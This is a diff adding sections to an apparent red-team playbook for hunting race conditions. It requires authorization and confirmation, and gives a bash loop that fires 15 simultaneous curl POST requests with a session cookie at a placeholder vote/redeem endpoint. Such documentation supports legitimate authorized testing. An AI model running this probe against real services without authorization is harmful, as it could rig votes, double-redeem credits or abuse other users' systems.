@@ -8,6 +8,35 @@ category: redteam
 tags: [race-condition, hunt, redteam]
 ---
 
+## When to Use
+
+- Hunting race conditions, TOCTOU bugs, MFA-bypass-via-timing.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Fire 15 simultaneous vote/redeem requests
+for i in $(seq 1 15); do
+  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}\n" \
+    -X POST "https://target.com/api/vote" \
+    -H "Cookie: session=YOUR_SESSION" \
+    -H "Content-Type: application/json" \
+    -d '{"report_id": "12345", "vote": "up"}' &
+done
+wait
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
+
 ## Crown Jewel Targets
 
 Race conditions are high-severity findings because they break financial, access control, and integrity assumptions that defenders rarely stress-test. Highest payouts come from:
